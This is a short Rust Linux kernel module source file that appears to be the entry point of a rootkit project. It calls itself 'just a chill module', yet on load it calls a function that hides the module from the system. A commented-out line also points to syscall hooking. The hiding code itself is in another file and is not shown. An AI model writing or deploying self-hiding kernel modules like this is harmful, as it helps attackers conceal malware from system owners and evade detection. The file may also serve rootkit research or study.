//! Innocent Rusty module
#![allow(unused)]
#![no_std]

use kernel::bindings::list_head;
use kernel::prelude::*;
use kernel::*;

mod features;

module! {
    type: IRM,
    name: "irm",
    author: "Began Bajrami",
    description: "just a chill module",
    license: "GPL",
}
struct IRM;

impl kernel::Module for IRM {
    fn init(_module: &'static ThisModule) -> Result<Self> {
        pr_info!("hey bud, wassup");
        features::hide::hidemod(_module);
        // features::hooking::syscall::hook_syscalls();
        Ok(IRM)
    }
}

impl Drop for IRM {
    fn drop(&mut self) {
        pr_info!("Why? Nobody likes me, I'm an Innocent chill module ;( \n");
    }
}
